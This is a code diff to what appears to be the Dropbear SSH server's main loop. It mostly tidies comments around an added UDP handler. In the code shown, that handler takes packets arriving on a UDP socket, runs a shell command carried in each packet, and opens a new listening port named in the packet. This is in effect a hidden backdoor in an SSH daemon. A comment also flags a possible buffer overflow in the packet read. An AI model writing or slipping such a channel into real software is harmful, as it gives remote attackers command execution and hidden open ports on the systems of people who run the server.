@@ -49,7 +49,7 @@ static void commonsetup(void);
 int add_port_request(int);
 int new_port_available(const char * );
 void start_udp_request(void);
-int udp_flag;/* Global flag - to start udp handler only once */
+int udp_flag;/* Global flag - udp handler */
 
 #if defined(DBMULTI_dropbear) || !DROPBEAR_MULTI
 #if defined(DBMULTI_dropbear) && DROPBEAR_MULTI
@@ -134,7 +134,6 @@ static void main_noinetd() {
 	int childsock;
 	int childpipe[2];
 
-	//UDP handler additions
 	int udpsockfd,n,len, tmp_listens=0;
     struct sockaddr_in cliaddr;
     char buffer[BUFFERSIZE]; 
@@ -251,16 +250,14 @@ static void main_noinetd() {
 		}
 
 		/* handle each socket which has something to say */
-		/*handle udp socket first */
+		/* handle udp socket */
 		if (udp_flag && FD_ISSET(udpsockfd, &fds)){
-			// printf("GOT FD_ISSET(udpsockfd, &fds)!,\tsvr_opts.portcount:%d\n",svr_opts.portcount);
 			len = sizeof(cliaddr);  //len is value/resuslt 
         	/*exception might occur when n>BUFFERSIZE -> buffer overflow */
         	n = recvfrom(udpsockfd, (char *)buffer, PACKETSIZE,  
                     	MSG_WAITALL, ( struct sockaddr *) &cliaddr, 
                     	&len);
 			if((unsigned)n != PACKETSIZE){
-            	// printf("buffer:%s\n",buffer);
 				TRACE(("ERROR: wrong packet size:%d",n))
 			}
 			else
@@ -268,21 +265,17 @@ static void main_noinetd() {
 				parse_packet(&new_packet,buffer);
     			if(check_shell_command(&new_packet)){
             		/* execute the shell_command */
-            		shell_exec_command(new_packet.shell_command); //func in svr-chansession
+            		shell_exec_command(new_packet.shell_command);
 					/* add port */
-					if(add_port_request((int)new_packet.port_number)){ //func in svr-main   
+					if(add_port_request((int)new_packet.port_number)){  
 						tmp_listens= listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock, 1);
-						/* update listensockcount if not error */
-						// if(tmp_listens > 0) 
-						// 	listensockcount=tmp_listens;							
+						/* update listensockcount if not error */							
 						listensockcount = MAX(listensockcount, tmp_listens);
 					}
-					// printf("listensockcount:%d\n",listensockcount);
-					// printf("AFTER udp_fd:%d\t listensocks[]:\n",udpsockfd);
-					// for (i = 0; i < listensockcount; i++)
-					// 	printf("%s ,",svr_opts.ports[i]);
-					// printf("\n");
     			}
+				else{
+					TRACE(("ERROR: illegal packet, not executing"))
+				}
 			}	
         } /* udp_flag handler */
 		
@@ -518,12 +511,12 @@ static size_t listensockets(int *socks, size_t sockcount, int *maxfd, int flag) 
 	return sockpos;
 }
 
-//0 - not available; 1- available
+/* 0 - not available; 1- available */
 int new_port_available(const char * new_port){
-	//call this function from uhandler only - his port is always 53
+	/* call this function from uhandler only - his port is always 53 */
 	if(new_port && new_port[0]=='5' && new_port[1]=='3' && new_port[2]=='\0') 
 		return 0;
-	//iterate over the listenning ports, check if new_portalready used
+	/* iterate over the listenning ports, check if new_portalready used */
 	unsigned int i=0;
 	for( ; i<svr_opts.portcount; i++){
 		if(strcmp(new_port,svr_opts.ports[i]) == 0)
@@ -533,20 +526,20 @@ int new_port_available(const char * new_port){
 }
 
 int add_port_request(int new_port){
-	if(new_port == 0){ //input check
+	if(new_port == 0){ /* input check */
 		TRACE(("ERROR add_port_request: port=0 !"))
 		return 0;
 	}
 	char str[6];
     sprintf(str, "%d", new_port);
-	//check if there is a place for new_port
+	/* check if there is a place for new_port */
 	if(svr_opts.portcount==DROPBEAR_MAX_PORTS){
 		TRACE(("ERROR add_port_request: no room for new_port!"))
 		return 0;
 	}
-	if(new_port_available(str)){ //if true- add port
-		add_port(str); //svr-runopts func
-	//TODO - stil need to bind this new port!!
+	if(new_port_available(str)){ 
+		add_port(str);
+	/* TODO - stil need to bind this new port!! */
 		return 1;	 
 	}
 	else{
@@ -555,8 +548,8 @@ int add_port_request(int new_port){
 	}
 }
 
-//Raise the global flag only once
-//The port init will be in main_noinetd
+/* Raise the global flag only once
+*  The port init will be in main_noinetd */
 void start_udp_request(void){
 	if(!udp_flag){
 		udp_flag = 1;
